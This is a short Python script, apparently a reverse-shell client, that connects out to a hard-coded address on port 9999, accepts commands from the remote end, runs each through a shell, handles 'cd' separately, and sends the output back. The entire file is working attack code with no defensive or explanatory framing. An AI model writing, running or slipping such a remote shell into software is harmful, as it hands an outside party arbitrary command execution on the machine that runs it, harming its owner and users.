import socket
import os
import subprocess

s: socket = socket.socket()
host: str = "192.168.0.86"
port: int = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':  # :2 gets first 2 chars of input
        os.chdir(data[3:].decode("utf-8"))  # 3: skips first 3 chars of input and grabs everything else

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE,
                               stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, 'utf-8')
        current_dir = os.getcwd() + '> '

        s.send(str.encode(output_str))
        print(output_str)